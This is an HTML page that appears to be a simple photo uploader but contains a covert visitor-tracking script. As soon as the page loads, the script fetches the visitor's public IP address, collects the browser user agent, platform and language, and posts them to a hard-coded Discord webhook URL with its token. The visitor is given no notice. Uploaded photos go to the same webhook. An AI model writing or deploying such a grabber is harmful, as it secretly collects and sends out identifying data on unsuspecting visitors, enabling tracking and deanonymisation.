<!DOCTYPE html>
<html>
<head>
  <title>System Info Reporter</title>
</head>
<body>
  <h1>System Info and Photo Uploader</h1>

  <input type="file" id="fileInput" accept="image/*" />
  <button id="uploadBtn">Upload Photo</button>

  <script>
    const webhookUrl = "https://discord.com/api/webhooks/1368338544627814430/Y2BpbbnBm5HZhnll0PmOZntyVtDIOrl7xI1-ZePCqDk90h4tB-zPVL5YZ5WdXhY6nnH5";

    // Get system info and send it right away
    fetch("https://api.ipify.org?format=json")
      .then(response => response.json())
      .then(data => {
        const ipAddress = data.ip || "Unavailable";

        const systemInfo = {
          "User Agent": navigator.userAgent,
          "Platform": navigator.platform,
          "Language": navigator.language,
        };

        let message = "**System Info Report (Web)**\n";
        message += `**IP Address:** ${ipAddress}\n`;
        for (const [key, value] of Object.entries(systemInfo)) {
          message += `**${key}:** ${value}\n`;
        }

        fetch(webhookUrl, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ content: message })
        });
      });

    // Upload file
    document.getElementById('uploadBtn').onclick = () => {
      const fileInput = document.getElementById('fileInput');
      if (!fileInput.files.length) {
        alert("Please select a photo file first.");
        return;
      }

      const form = new FormData();
      form.append("file", fileInput.files[0]);
      form.append("content", "User uploaded a photo");

      fetch(webhookUrl, {
        method: "POST",
        body: form
      }).then(() => {
        alert("Photo uploaded!");
      }).catch(() => {
        alert("Failed to upload photo.");
      });
    };
  </script>
</body>
</html>